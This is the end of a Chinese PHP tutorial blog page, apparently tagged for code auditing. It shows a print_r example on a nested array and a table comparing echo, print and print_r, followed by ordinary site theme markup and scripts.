<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span> (<span class="string">'a'</span> =&gt; <span class="string">'apple'</span>, <span class="string">'b'</span> =&gt; <span class="string">'banana'</span>, <span class="string">'c'</span> =&gt; <span class="keyword">array</span> (<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>));</span><br><span class="line">print_r ($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( [a] =&gt; apple [b] =&gt; banana [c] =&gt; <span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; x [<span class="number">1</span>] =&gt; y [<span class="number">2</span>] =&gt; z ) )</span><br></pre></td></tr></table></figure>



<h3 id="echo、print、print-r-三者区别"><a href="#echo、print、print-r-三者区别" class="headerlink" title="echo、print、print_r 三者区别"></a><strong>echo、print、print_r 三者区别</strong></h3><table>
<thead>
<tr>
<th align="center"></th>
<th align="center">属性</th>
<th align="center">打印输出</th>
<th align="center">用法</th>
<th align="center">返回值</th>
<th align="center">执行          速率</th>
</tr>
</thead>
<tbody><tr>
<td align="center">echo</td>
<td align="center">PHP语句</td>
<td align="center">输出一个或者多个字符串</td>
<td align="center">echo   或者 echo()</td>
<td align="center">无</td>
<td align="center">最快</td>
</tr>
<tr>
<td align="center">print</td>
<td align="center">实际上不是函数（而是语言结构），所以可以不用圆括号包围参数列表</td>
<td align="center">只能打印出简单类型变量的值(如int,string)</td>
<td align="center">print  或者print()</td>
<td align="center">1</td>
<td align="center">其次</td>
</tr>
<tr>
<td align="center">print_r</td>
<td align="center">函数,语句没有返回值,函数可以有返回值(即便没有用)</td>
<td align="center">可以打印出复杂类型变量的值(如数组,对象)</td>
<td align="center">print_r()</td>
<td align="center">输出成功时，返回true，不成功时返回false</td>
<td align="center">最慢</td>
</tr>
</tbody></table>
<hr>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>


    </footer>

  </div>

  

  
  
  

  

</article>
    
  </article>
  

  
  <nav class="page-nav">
    
    <a class="extend prev" rel="prev" href="/">上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">下一页</a>
  </nav>
  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul class="list-inline">
      <li>
        &copy;
        2020
        0Rld
      </li>
      <li>
        
          Powered by
        
        
        <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
        
      </li>
    </ul>
    <ul class="list-inline">
      <li>
        
        
        <span>
  <i>PV:<span id="busuanzi_value_page_pv"></span></i>
  <i>UV:<span id="busuanzi_value_site_uv"></span></i>
</span>
        
      </li>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src=''></script>
        
      </li>
    </ul>
  </div>
</footer>
    <div class="to_top">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>
      </div>
    </main>
      <aside class="sidebar">
        <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/1.jpg" alt="0Rld"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/2020/about">About</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="Search">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
      </aside>
      <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>Buy me a cup of coffee~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
      
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/lazyload.min.js"></script>


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<script src="/js/share.js"></script>



<script src="/fancybox/jquery.fancybox.min.js"></script>




<script>
  try {
    var typed = new Typed("#subtitle", {
    strings: ['四季更替，梦境更迭','生活,旅行,思考,代码,博客','努力一定会有所获！'],
    startDelay: 0,
    typeSpeed: 200,
    loop: true,
    backSpeed: 100,
    showCursor: true
    });
  } catch (err) {
  }
  
</script>




<script>
  var ayerConfig = {
    mathjax: true
  }
</script>


<script src="/js/ayer.js"></script>


<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>



<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>


<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
  </div>
</body>

</html>